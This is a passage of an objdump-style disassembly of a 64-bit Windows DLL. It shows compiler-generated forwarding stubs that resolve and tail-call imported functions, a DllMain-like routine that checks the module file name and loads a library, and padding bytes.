   180001711:	48 89 05 88 c4 01 00 	mov    %rax,0x1c488(%rip)        # 0x18001dba0
   180001718:	ba 6c 00 00 00       	mov    $0x6c,%edx
   18000171d:	48 8b 0d 1c c4 01 00 	mov    0x1c41c(%rip),%rcx        # 0x18001db40
   180001724:	ff 15 ee 08 01 00    	call   *0x108ee(%rip)        # 0x180012018
   18000172a:	48 89 05 77 c4 01 00 	mov    %rax,0x1c477(%rip)        # 0x18001dba8
   180001731:	48 8b 54 24 70       	mov    0x70(%rsp),%rdx
   180001736:	48 83 fa 0f          	cmp    $0xf,%rdx
   18000173a:	76 2e                	jbe    0x18000176a
   18000173c:	48 ff c2             	inc    %rdx
   18000173f:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   180001744:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   18000174b:	72 18                	jb     0x180001765
   18000174d:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   180001751:	48 2b c8             	sub    %rax,%rcx
   180001754:	48 83 e9 08          	sub    $0x8,%rcx
   180001758:	48 83 f9 1f          	cmp    $0x1f,%rcx
   18000175c:	77 30                	ja     0x18000178e
   18000175e:	48 83 c2 27          	add    $0x27,%rdx
   180001762:	48 8b c8             	mov    %rax,%rcx
   180001765:	e8 36 07 00 00       	call   0x180001ea0
   18000176a:	48 8b 8d 90 00 00 00 	mov    0x90(%rbp),%rcx
   180001771:	48 33 cc             	xor    %rsp,%rcx
   180001774:	e8 b7 09 00 00       	call   0x180002130
   180001779:	4c 8d 9c 24 a0 01 00 	lea    0x1a0(%rsp),%r11
   180001780:	00 
   180001781:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   180001785:	49 8b 7b 18          	mov    0x18(%r11),%rdi
   180001789:	49 8b e3             	mov    %r11,%rsp
   18000178c:	5d                   	pop    %rbp
   18000178d:	c3                   	ret
   18000178e:	b9 05 00 00 00       	mov    $0x5,%ecx
   180001793:	cd 29                	int    $0x29
   180001795:	cc                   	int3
   180001796:	cc                   	int3
   180001797:	cc                   	int3
   180001798:	cc                   	int3
   180001799:	cc                   	int3
   18000179a:	cc                   	int3
   18000179b:	cc                   	int3
   18000179c:	cc                   	int3
   18000179d:	cc                   	int3
   18000179e:	cc                   	int3
   18000179f:	cc                   	int3
   1800017a0:	48 83 ec 48          	sub    $0x48,%rsp
   1800017a4:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1800017a9:	e8 62 fb ff ff       	call   0x180001310
   1800017ae:	48 8d 15 b3 a1 01 00 	lea    0x1a1b3(%rip),%rdx        # 0x18001b968
   1800017b5:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1800017ba:	e8 c1 17 00 00       	call   0x180002f80
   1800017bf:	cc                   	int3
   1800017c0:	48 83 ec 28          	sub    $0x28,%rsp
   1800017c4:	48 8d 0d ad 0b 01 00 	lea    0x10bad(%rip),%rcx        # 0x180012378
   1800017cb:	e8 50 06 00 00       	call   0x180001e20
   1800017d0:	cc                   	int3
   1800017d1:	cc                   	int3
   1800017d2:	cc                   	int3
   1800017d3:	cc                   	int3
   1800017d4:	cc                   	int3
   1800017d5:	cc                   	int3
   1800017d6:	cc                   	int3
   1800017d7:	cc                   	int3
   1800017d8:	cc                   	int3
   1800017d9:	cc                   	int3
   1800017da:	cc                   	int3
   1800017db:	cc                   	int3
   1800017dc:	cc                   	int3
   1800017dd:	cc                   	int3
   1800017de:	cc                   	int3
   1800017df:	cc                   	int3
   1800017e0:	48 8b 51 08          	mov    0x8(%rcx),%rdx
   1800017e4:	48 8d 05 2d 0b 01 00 	lea    0x10b2d(%rip),%rax        # 0x180012318
   1800017eb:	48 85 d2             	test   %rdx,%rdx
   1800017ee:	48 0f 45 c2          	cmovne %rdx,%rax
   1800017f2:	c3                   	ret
   1800017f3:	cc                   	int3
   1800017f4:	cc                   	int3
   1800017f5:	cc                   	int3
   1800017f6:	cc                   	int3
   1800017f7:	cc                   	int3
   1800017f8:	cc                   	int3
   1800017f9:	cc                   	int3
   1800017fa:	cc                   	int3
   1800017fb:	cc                   	int3
   1800017fc:	cc                   	int3
   1800017fd:	cc                   	int3
   1800017fe:	cc                   	int3
   1800017ff:	cc                   	int3
   180001800:	48 81 ec 48 01 00 00 	sub    $0x148,%rsp
   180001807:	48 8b 05 f2 b7 01 00 	mov    0x1b7f2(%rip),%rax        # 0x18001d000
   18000180e:	48 33 c4             	xor    %rsp,%rax
   180001811:	48 89 84 24 30 01 00 	mov    %rax,0x130(%rsp)
   180001818:	00 
   180001819:	83 fa 01             	cmp    $0x1,%edx
   18000181c:	0f 85 82 00 00 00    	jne    0x1800018a4
   180001822:	ff 15 e0 07 01 00    	call   *0x107e0(%rip)        # 0x180012008
   180001828:	e8 33 fc ff ff       	call   0x180001460
   18000182d:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   180001833:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   180001838:	33 c9                	xor    %ecx,%ecx
   18000183a:	ff 15 d0 07 01 00    	call   *0x107d0(%rip)        # 0x180012010
   180001840:	85 c0                	test   %eax,%eax
   180001842:	74 31                	je     0x180001875
   180001844:	ba 5c 00 00 00       	mov    $0x5c,%edx
   180001849:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   18000184e:	e8 0d 15 00 00       	call   0x180002d60
   180001853:	48 85 c0             	test   %rax,%rax
   180001856:	74 05                	je     0x18000185d
   180001858:	48 ff c0             	inc    %rax
   18000185b:	eb 05                	jmp    0x180001862
   18000185d:	48 8d 44 24 20       	lea    0x20(%rsp),%rax
   180001862:	48 8d 15 c7 0b 01 00 	lea    0x10bc7(%rip),%rdx        # 0x180012430
   180001869:	48 8b c8             	mov    %rax,%rcx
   18000186c:	e8 af 66 00 00       	call   0x180007f20
   180001871:	85 c0                	test   %eax,%eax
   180001873:	75 2f                	jne    0x1800018a4
   180001875:	48 8d 0d c4 0b 01 00 	lea    0x10bc4(%rip),%rcx        # 0x180012440
   18000187c:	ff 15 9e 07 01 00    	call   *0x1079e(%rip)        # 0x180012020
   180001882:	33 c9                	xor    %ecx,%ecx
   180001884:	48 85 c0             	test   %rax,%rax
   180001887:	0f 95 c1             	setne  %cl
   18000188a:	8b c1                	mov    %ecx,%eax
   18000188c:	48 8b 8c 24 30 01 00 	mov    0x130(%rsp),%rcx
   180001893:	00 
   180001894:	48 33 cc             	xor    %rsp,%rcx
   180001897:	e8 94 08 00 00       	call   0x180002130
   18000189c:	48 81 c4 48 01 00 00 	add    $0x148,%rsp
   1800018a3:	c3                   	ret
   1800018a4:	b8 01 00 00 00       	mov    $0x1,%eax
   1800018a9:	48 8b 8c 24 30 01 00 	mov    0x130(%rsp),%rcx
   1800018b0:	00 
   1800018b1:	48 33 cc             	xor    %rsp,%rcx
   1800018b4:	e8 77 08 00 00       	call   0x180002130
   1800018b9:	48 81 c4 48 01 00 00 	add    $0x148,%rsp
   1800018c0:	c3                   	ret
   1800018c1:	cc                   	int3
   1800018c2:	cc                   	int3
   1800018c3:	cc                   	int3
   1800018c4:	cc                   	int3
   1800018c5:	cc                   	int3
   1800018c6:	cc                   	int3
   1800018c7:	cc                   	int3
   1800018c8:	cc                   	int3
   1800018c9:	cc                   	int3
   1800018ca:	cc                   	int3
   1800018cb:	cc                   	int3
   1800018cc:	cc                   	int3
   1800018cd:	cc                   	int3
   1800018ce:	cc                   	int3
   1800018cf:	cc                   	int3
   1800018d0:	40 53                	rex push %rbx
   1800018d2:	48 83 ec 20          	sub    $0x20,%rsp
   1800018d6:	48 83 3d 62 c2 01 00 	cmpq   $0x0,0x1c262(%rip)        # 0x18001db40
   1800018dd:	00 
   1800018de:	8b d9                	mov    %ecx,%ebx
   1800018e0:	75 05                	jne    0x1800018e7
   1800018e2:	e8 79 fb ff ff       	call   0x180001460
   1800018e7:	48 8b 05 72 c2 01 00 	mov    0x1c272(%rip),%rax        # 0x18001db60
   1800018ee:	48 85 c0             	test   %rax,%rax
   1800018f1:	74 0a                	je     0x1800018fd
   1800018f3:	8b cb                	mov    %ebx,%ecx
   1800018f5:	48 83 c4 20          	add    $0x20,%rsp
   1800018f9:	5b                   	pop    %rbx
   1800018fa:	48 ff e0             	rex.W jmp *%rax
   1800018fd:	48 83 c4 20          	add    $0x20,%rsp
   180001901:	5b                   	pop    %rbx
   180001902:	c3                   	ret
   180001903:	cc                   	int3
   180001904:	cc                   	int3
   180001905:	cc                   	int3
   180001906:	cc                   	int3
   180001907:	cc                   	int3
   180001908:	cc                   	int3
   180001909:	cc                   	int3
   18000190a:	cc                   	int3
   18000190b:	cc                   	int3
   18000190c:	cc                   	int3
   18000190d:	cc                   	int3
   18000190e:	cc                   	int3
   18000190f:	cc                   	int3
   180001910:	40 53                	rex push %rbx
   180001912:	55                   	push   %rbp
   180001913:	56                   	push   %rsi
   180001914:	57                   	push   %rdi
   180001915:	48 83 ec 38          	sub    $0x38,%rsp
   180001919:	48 83 3d 1f c2 01 00 	cmpq   $0x0,0x1c21f(%rip)        # 0x18001db40
   180001920:	00 
   180001921:	49 8b d9             	mov    %r9,%rbx
   180001924:	49 8b f8             	mov    %r8,%rdi
   180001927:	48 8b f2             	mov    %rdx,%rsi
   18000192a:	8b e9                	mov    %ecx,%ebp
   18000192c:	75 05                	jne    0x180001933
   18000192e:	e8 2d fb ff ff       	call   0x180001460
   180001933:	4c 8b 15 2e c2 01 00 	mov    0x1c22e(%rip),%r10        # 0x18001db68
   18000193a:	4d 85 d2             	test   %r10,%r10
   18000193d:	74 16                	je     0x180001955
   18000193f:	4c 8b cb             	mov    %rbx,%r9
   180001942:	4c 8b c7             	mov    %rdi,%r8
   180001945:	48 8b d6             	mov    %rsi,%rdx
   180001948:	8b cd                	mov    %ebp,%ecx
   18000194a:	48 83 c4 38          	add    $0x38,%rsp
   18000194e:	5f                   	pop    %rdi
   18000194f:	5e                   	pop    %rsi
   180001950:	5d                   	pop    %rbp
   180001951:	5b                   	pop    %rbx
   180001952:	49 ff e2             	rex.WB jmp *%r10
   180001955:	b8 8f 04 00 00       	mov    $0x48f,%eax
   18000195a:	48 83 c4 38          	add    $0x38,%rsp
   18000195e:	5f                   	pop    %rdi
   18000195f:	5e                   	pop    %rsi
   180001960:	5d                   	pop    %rbp
   180001961:	5b                   	pop    %rbx
   180001962:	c3                   	ret
   180001963:	cc                   	int3
   180001964:	cc                   	int3
   180001965:	cc                   	int3
   180001966:	cc                   	int3
   180001967:	cc                   	int3
   180001968:	cc                   	int3
   180001969:	cc                   	int3
   18000196a:	cc                   	int3
   18000196b:	cc                   	int3
   18000196c:	cc                   	int3
   18000196d:	cc                   	int3
   18000196e:	cc                   	int3
   18000196f:	cc                   	int3
   180001970:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001975:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   18000197a:	57                   	push   %rdi
   18000197b:	48 83 ec 20          	sub    $0x20,%rsp
   18000197f:	48 83 3d b9 c1 01 00 	cmpq   $0x0,0x1c1b9(%rip)        # 0x18001db40
   180001986:	00 
   180001987:	49 8b d8             	mov    %r8,%rbx
   18000198a:	0f b6 fa             	movzbl %dl,%edi
   18000198d:	8b f1                	mov    %ecx,%esi
   18000198f:	75 05                	jne    0x180001996
   180001991:	e8 ca fa ff ff       	call   0x180001460
   180001996:	48 8b 05 d3 c1 01 00 	mov    0x1c1d3(%rip),%rax        # 0x18001db70
   18000199d:	48 85 c0             	test   %rax,%rax
   1800019a0:	74 1b                	je     0x1800019bd
   1800019a2:	4c 8b c3             	mov    %rbx,%r8
   1800019a5:	40 0f b6 d7          	movzbl %dil,%edx
   1800019a9:	8b ce                	mov    %esi,%ecx
   1800019ab:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1800019b0:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1800019b5:	48 83 c4 20          	add    $0x20,%rsp
   1800019b9:	5f                   	pop    %rdi
   1800019ba:	48 ff e0             	rex.W jmp *%rax
   1800019bd:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1800019c2:	b8 8f 04 00 00       	mov    $0x48f,%eax
   1800019c7:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1800019cc:	48 83 c4 20          	add    $0x20,%rsp
   1800019d0:	5f                   	pop    %rdi
   1800019d1:	c3                   	ret
   1800019d2:	cc                   	int3
   1800019d3:	cc                   	int3
   1800019d4:	cc                   	int3
   1800019d5:	cc                   	int3
   1800019d6:	cc                   	int3
   1800019d7:	cc                   	int3
   1800019d8:	cc                   	int3
   1800019d9:	cc                   	int3
   1800019da:	cc                   	int3
   1800019db:	cc                   	int3
   1800019dc:	cc                   	int3
   1800019dd:	cc                   	int3
   1800019de:	cc                   	int3
   1800019df:	cc                   	int3
   1800019e0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800019e5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1800019ea:	57                   	push   %rdi
   1800019eb:	48 83 ec 20          	sub    $0x20,%rsp
   1800019ef:	48 83 3d 49 c1 01 00 	cmpq   $0x0,0x1c149(%rip)        # 0x18001db40
   1800019f6:	00 
   1800019f7:	49 8b d8             	mov    %r8,%rbx
   1800019fa:	8b fa                	mov    %edx,%edi
   1800019fc:	8b f1                	mov    %ecx,%esi
   1800019fe:	75 05                	jne    0x180001a05
   180001a00:	e8 5b fa ff ff       	call   0x180001460
   180001a05:	48 8b 05 4c c1 01 00 	mov    0x1c14c(%rip),%rax        # 0x18001db58
   180001a0c:	48 85 c0             	test   %rax,%rax
   180001a0f:	74 19                	je     0x180001a2a
   180001a11:	4c 8b c3             	mov    %rbx,%r8
   180001a14:	8b d7                	mov    %edi,%edx
   180001a16:	8b ce                	mov    %esi,%ecx
   180001a18:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180001a1d:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   180001a22:	48 83 c4 20          	add    $0x20,%rsp
   180001a26:	5f                   	pop    %rdi
   180001a27:	48 ff e0             	rex.W jmp *%rax
   180001a2a:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180001a2f:	b8 8f 04 00 00       	mov    $0x48f,%eax
   180001a34:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   180001a39:	48 83 c4 20          	add    $0x20,%rsp
   180001a3d:	5f                   	pop    %rdi
   180001a3e:	c3                   	ret
   180001a3f:	cc                   	int3
   180001a40:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001a45:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   180001a4a:	57                   	push   %rdi
   180001a4b:	48 83 ec 20          	sub    $0x20,%rsp
   180001a4f:	48 83 3d e9 c0 01 00 	cmpq   $0x0,0x1c0e9(%rip)        # 0x18001db40
   180001a56:	00 
   180001a57:	49 8b d8             	mov    %r8,%rbx
   180001a5a:	8b fa                	mov    %edx,%edi
   180001a5c:	8b f1                	mov    %ecx,%esi
   180001a5e:	75 05                	jne    0x180001a65
   180001a60:	e8 fb f9 ff ff       	call   0x180001460
   180001a65:	48 8b 05 0c c1 01 00 	mov    0x1c10c(%rip),%rax        # 0x18001db78
   180001a6c:	48 85 c0             	test   %rax,%rax
   180001a6f:	74 19                	je     0x180001a8a
   180001a71:	4c 8b c3             	mov    %rbx,%r8
   180001a74:	8b d7                	mov    %edi,%edx
   180001a76:	8b ce                	mov    %esi,%ecx
   180001a78:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180001a7d:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   180001a82:	48 83 c4 20          	add    $0x20,%rsp
   180001a86:	5f                   	pop    %rdi
   180001a87:	48 ff e0             	rex.W jmp *%rax
   180001a8a:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180001a8f:	b8 8f 04 00 00       	mov    $0x48f,%eax
   180001a94:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   180001a99:	48 83 c4 20          	add    $0x20,%rsp
   180001a9d:	5f                   	pop    %rdi
   180001a9e:	c3                   	ret
   180001a9f:	cc                   	int3
   180001aa0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001aa5:	57                   	push   %rdi
   180001aa6:	48 83 ec 20          	sub    $0x20,%rsp
   180001aaa:	48 83 3d 8e c0 01 00 	cmpq   $0x0,0x1c08e(%rip)        # 0x18001db40
   180001ab1:	00 
   180001ab2:	48 8b da             	mov    %rdx,%rbx
   180001ab5:	8b f9                	mov    %ecx,%edi
   180001ab7:	75 05                	jne    0x180001abe
   180001ab9:	e8 a2 f9 ff ff       	call   0x180001460
   180001abe:	48 8b 05 83 c0 01 00 	mov    0x1c083(%rip),%rax        # 0x18001db48
   180001ac5:	48 85 c0             	test   %rax,%rax
   180001ac8:	74 12                	je     0x180001adc
   180001aca:	48 8b d3             	mov    %rbx,%rdx
   180001acd:	8b cf                	mov    %edi,%ecx
   180001acf:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180001ad4:	48 83 c4 20          	add    $0x20,%rsp
   180001ad8:	5f                   	pop    %rdi
   180001ad9:	48 ff e0             	rex.W jmp *%rax
   180001adc:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180001ae1:	b8 8f 04 00 00       	mov    $0x48f,%eax
   180001ae6:	48 83 c4 20          	add    $0x20,%rsp
   180001aea:	5f                   	pop    %rdi
   180001aeb:	c3                   	ret
   180001aec:	cc                   	int3
   180001aed:	cc                   	int3
   180001aee:	cc                   	int3
   180001aef:	cc                   	int3
   180001af0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001af5:	57                   	push   %rdi
   180001af6:	48 83 ec 20          	sub    $0x20,%rsp
   180001afa:	48 83 3d 3e c0 01 00 	cmpq   $0x0,0x1c03e(%rip)        # 0x18001db40
   180001b01:	00 
   180001b02:	48 8b da             	mov    %rdx,%rbx
   180001b05:	8b f9                	mov    %ecx,%edi
   180001b07:	75 05                	jne    0x180001b0e
   180001b09:	e8 52 f9 ff ff       	call   0x180001460
   180001b0e:	48 8b 05 6b c0 01 00 	mov    0x1c06b(%rip),%rax        # 0x18001db80
   180001b15:	48 85 c0             	test   %rax,%rax
   180001b18:	74 12                	je     0x180001b2c
   180001b1a:	48 8b d3             	mov    %rbx,%rdx
   180001b1d:	8b cf                	mov    %edi,%ecx
   180001b1f:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180001b24:	48 83 c4 20          	add    $0x20,%rsp
   180001b28:	5f                   	pop    %rdi
   180001b29:	48 ff e0             	rex.W jmp *%rax
   180001b2c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180001b31:	b8 8f 04 00 00       	mov    $0x48f,%eax
   180001b36:	48 83 c4 20          	add    $0x20,%rsp
   180001b3a:	5f                   	pop    %rdi
   180001b3b:	c3                   	ret
   180001b3c:	cc                   	int3
   180001b3d:	cc                   	int3
   180001b3e:	cc                   	int3
   180001b3f:	cc                   	int3
   180001b40:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001b45:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   180001b4a:	57                   	push   %rdi
   180001b4b:	48 83 ec 20          	sub    $0x20,%rsp
   180001b4f:	48 83 3d e9 bf 01 00 	cmpq   $0x0,0x1bfe9(%rip)        # 0x18001db40
   180001b56:	00 
   180001b57:	49 8b d8             	mov    %r8,%rbx
   180001b5a:	8b fa                	mov    %edx,%edi
   180001b5c:	8b f1                	mov    %ecx,%esi
   180001b5e:	75 05                	jne    0x180001b65
   180001b60:	e8 fb f8 ff ff       	call   0x180001460
   180001b65:	48 8b 05 1c c0 01 00 	mov    0x1c01c(%rip),%rax        # 0x18001db88
   180001b6c:	48 85 c0             	test   %rax,%rax
   180001b6f:	74 19                	je     0x180001b8a
   180001b71:	4c 8b c3             	mov    %rbx,%r8
   180001b74:	8b d7                	mov    %edi,%edx
   180001b76:	8b ce                	mov    %esi,%ecx
   180001b78:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180001b7d:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   180001b82:	48 83 c4 20          	add    $0x20,%rsp
   180001b86:	5f                   	pop    %rdi
   180001b87:	48 ff e0             	rex.W jmp *%rax
   180001b8a:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180001b8f:	b8 8f 04 00 00       	mov    $0x48f,%eax
   180001b94:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   180001b99:	48 83 c4 20          	add    $0x20,%rsp
   180001b9d:	5f                   	pop    %rdi
   180001b9e:	c3                   	ret
   180001b9f:	cc                   	int3
   180001ba0:	40 53                	rex push %rbx
   180001ba2:	48 83 ec 20          	sub    $0x20,%rsp
   180001ba6:	48 83 3d 92 bf 01 00 	cmpq   $0x0,0x1bf92(%rip)        # 0x18001db40
   180001bad:	00 
   180001bae:	8b d9                	mov    %ecx,%ebx
   180001bb0:	75 05                	jne    0x180001bb7
   180001bb2:	e8 a9 f8 ff ff       	call   0x180001460
   180001bb7:	48 8b 05 d2 bf 01 00 	mov    0x1bfd2(%rip),%rax        # 0x18001db90
   180001bbe:	48 85 c0             	test   %rax,%rax
   180001bc1:	74 0a                	je     0x180001bcd
   180001bc3:	8b cb                	mov    %ebx,%ecx
   180001bc5:	48 83 c4 20          	add    $0x20,%rsp
   180001bc9:	5b                   	pop    %rbx
   180001bca:	48 ff e0             	rex.W jmp *%rax
   180001bcd:	b8 8f 04 00 00       	mov    $0x48f,%eax
   180001bd2:	48 83 c4 20          	add    $0x20,%rsp
   180001bd6:	5b                   	pop    %rbx
   180001bd7:	c3                   	ret
   180001bd8:	cc                   	int3
   180001bd9:	cc                   	int3
   180001bda:	cc                   	int3
   180001bdb:	cc                   	int3
   180001bdc:	cc                   	int3
   180001bdd:	cc                   	int3
   180001bde:	cc                   	int3
   180001bdf:	cc                   	int3
   180001be0:	40 53                	rex push %rbx
   180001be2:	48 83 ec 20          	sub    $0x20,%rsp
   180001be6:	48 83 3d 52 bf 01 00 	cmpq   $0x0,0x1bf52(%rip)        # 0x18001db40
   180001bed:	00 
   180001bee:	8b d9                	mov    %ecx,%ebx
   180001bf0:	75 05                	jne    0x180001bf7
   180001bf2:	e8 69 f8 ff ff       	call   0x180001460
   180001bf7:	48 8b 05 9a bf 01 00 	mov    0x1bf9a(%rip),%rax        # 0x18001db98
   180001bfe:	48 85 c0             	test   %rax,%rax
   180001c01:	74 0a                	je     0x180001c0d
   180001c03:	8b cb                	mov    %ebx,%ecx
   180001c05:	48 83 c4 20          	add    $0x20,%rsp
   180001c09:	5b                   	pop    %rbx
   180001c0a:	48 ff e0             	rex.W jmp *%rax
   180001c0d:	b8 8f 04 00 00       	mov    $0x48f,%eax
   180001c12:	48 83 c4 20          	add    $0x20,%rsp
   180001c16:	5b                   	pop    %rbx
   180001c17:	c3                   	ret
   180001c18:	cc                   	int3
   180001c19:	cc                   	int3
   180001c1a:	cc                   	int3
   180001c1b:	cc                   	int3
   180001c1c:	cc                   	int3
   180001c1d:	cc                   	int3
   180001c1e:	cc                   	int3
   180001c1f:	cc                   	int3
   180001c20:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001c25:	57                   	push   %rdi
   180001c26:	48 83 ec 20          	sub    $0x20,%rsp
   180001c2a:	48 83 3d 0e bf 01 00 	cmpq   $0x0,0x1bf0e(%rip)        # 0x18001db40
   180001c31:	00 
   180001c32:	48 8b da             	mov    %rdx,%rbx
   180001c35:	8b f9                	mov    %ecx,%edi
   180001c37:	75 05                	jne    0x180001c3e
   180001c39:	e8 22 f8 ff ff       	call   0x180001460
   180001c3e:	48 8b 05 5b bf 01 00 	mov    0x1bf5b(%rip),%rax        # 0x18001dba0
   180001c45:	48 85 c0             	test   %rax,%rax
   180001c48:	74 12                	je     0x180001c5c
   180001c4a:	48 8b d3             	mov    %rbx,%rdx
   180001c4d:	8b cf                	mov    %edi,%ecx
   180001c4f:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180001c54:	48 83 c4 20          	add    $0x20,%rsp
   180001c58:	5f                   	pop    %rdi
   180001c59:	48 ff e0             	rex.W jmp *%rax
   180001c5c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180001c61:	b8 8f 04 00 00       	mov    $0x48f,%eax
   180001c66:	48 83 c4 20          	add    $0x20,%rsp
   180001c6a:	5f                   	pop    %rdi
   180001c6b:	c3                   	ret
   180001c6c:	cc                   	int3
   180001c6d:	cc                   	int3
   180001c6e:	cc                   	int3
   180001c6f:	cc                   	int3
   180001c70:	40 53                	rex push %rbx
   180001c72:	55                   	push   %rbp
   180001c73:	56                   	push   %rsi
   180001c74:	57                   	push   %rdi
   180001c75:	48 83 ec 38          	sub    $0x38,%rsp
   180001c79:	48 83 3d bf be 01 00 	cmpq   $0x0,0x1bebf(%rip)        # 0x18001db40
   180001c80:	00 
   180001c81:	49 8b d9             	mov    %r9,%rbx
   180001c84:	49 8b f8             	mov    %r8,%rdi
   180001c87:	48 8b f2             	mov    %rdx,%rsi
   180001c8a:	8b e9                	mov    %ecx,%ebp
   180001c8c:	75 05                	jne    0x180001c93
   180001c8e:	e8 cd f7 ff ff       	call   0x180001460
   180001c93:	4c 8b 15 0e bf 01 00 	mov    0x1bf0e(%rip),%r10        # 0x18001dba8
   180001c9a:	4d 85 d2             	test   %r10,%r10
   180001c9d:	74 16                	je     0x180001cb5
   180001c9f:	4c 8b cb             	mov    %rbx,%r9
   180001ca2:	4c 8b c7             	mov    %rdi,%r8
   180001ca5:	48 8b d6             	mov    %rsi,%rdx
   180001ca8:	8b cd                	mov    %ebp,%ecx
   180001caa:	48 83 c4 38          	add    $0x38,%rsp
   180001cae:	5f                   	pop    %rdi
   180001caf:	5e                   	pop    %rsi
   180001cb0:	5d                   	pop    %rbp
   180001cb1:	5b                   	pop    %rbx
   180001cb2:	49 ff e2             	rex.WB jmp *%r10
   180001cb5:	b8 8f 04 00 00       	mov    $0x48f,%eax
   180001cba:	48 83 c4 38          	add    $0x38,%rsp
   180001cbe:	5f                   	pop    %rdi
   180001cbf:	5e                   	pop    %rsi
   180001cc0:	5d                   	pop    %rbp
   180001cc1:	5b                   	pop    %rbx
   180001cc2:	c3                   	ret
   180001cc3:	cc                   	int3
   180001cc4:	cc                   	int3
   180001cc5:	cc                   	int3
   180001cc6:	cc                   	int3
   180001cc7:	cc                   	int3
   180001cc8:	cc                   	int3
   180001cc9:	cc                   	int3
   180001cca:	cc                   	int3
   180001ccb:	cc                   	int3
   180001ccc:	cc                   	int3
   180001ccd:	cc                   	int3
   180001cce:	cc                   	int3
   180001ccf:	cc                   	int3
   180001cd0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001cd5:	57                   	push   %rdi
   180001cd6:	48 83 ec 20          	sub    $0x20,%rsp
   180001cda:	48 83 3d 5e be 01 00 	cmpq   $0x0,0x1be5e(%rip)        # 0x18001db40
   180001ce1:	00 
   180001ce2:	48 8b da             	mov    %rdx,%rbx
   180001ce5:	8b f9                	mov    %ecx,%edi
   180001ce7:	75 05                	jne    0x180001cee
   180001ce9:	e8 72 f7 ff ff       	call   0x180001460
   180001cee:	48 8b 05 5b be 01 00 	mov    0x1be5b(%rip),%rax        # 0x18001db50
   180001cf5:	48 85 c0             	test   %rax,%rax
   180001cf8:	74 12                	je     0x180001d0c
   180001cfa:	48 8b d3             	mov    %rbx,%rdx
   180001cfd:	8b cf                	mov    %edi,%ecx
   180001cff:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180001d04:	48 83 c4 20          	add    $0x20,%rsp
   180001d08:	5f                   	pop    %rdi
   180001d09:	48 ff e0             	rex.W jmp *%rax
   180001d0c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180001d11:	b8 8f 04 00 00       	mov    $0x48f,%eax
   180001d16:	48 83 c4 20          	add    $0x20,%rsp
   180001d1a:	5f                   	pop    %rdi
   180001d1b:	c3                   	ret
   180001d1c:	cc                   	int3
   180001d1d:	cc                   	int3
   180001d1e:	cc                   	int3
   180001d1f:	cc                   	int3
   180001d20:	48 8d 05 29 07 01 00 	lea    0x10729(%rip),%rax        # 0x180012450
   180001d27:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   180001d2e:	00 
   180001d2f:	48 89 41 08          	mov    %rax,0x8(%rcx)
   180001d33:	48 8d 05 fe 05 01 00 	lea    0x105fe(%rip),%rax        # 0x180012338
   180001d3a:	48 89 01             	mov    %rax,(%rcx)
   180001d3d:	48 8b c1             	mov    %rcx,%rax
   180001d40:	c3                   	ret
   180001d41:	cc                   	int3
   180001d42:	cc                   	int3
   180001d43:	cc                   	int3
   180001d44:	cc                   	int3
   180001d45:	cc                   	int3
   180001d46:	cc                   	int3
   180001d47:	cc                   	int3
   180001d48:	cc                   	int3
   180001d49:	cc                   	int3
   180001d4a:	cc                   	int3
   180001d4b:	cc                   	int3
   180001d4c:	cc                   	int3
   180001d4d:	cc                   	int3
   180001d4e:	cc                   	int3
   180001d4f:	cc                   	int3
   180001d50:	40 53                	rex push %rbx
   180001d52:	48 83 ec 20          	sub    $0x20,%rsp
   180001d56:	48 8b d9             	mov    %rcx,%rbx
   180001d59:	48 8b c2             	mov    %rdx,%rax
   180001d5c:	48 8d 0d a5 05 01 00 	lea    0x105a5(%rip),%rcx        # 0x180012308
   180001d63:	0f 57 c0             	xorps  %xmm0,%xmm0
   180001d66:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   180001d6a:	48 89 0b             	mov    %rcx,(%rbx)
   180001d6d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   180001d71:	0f 11 02             	movups %xmm0,(%rdx)
   180001d74:	e8 27 11 00 00       	call   0x180002ea0
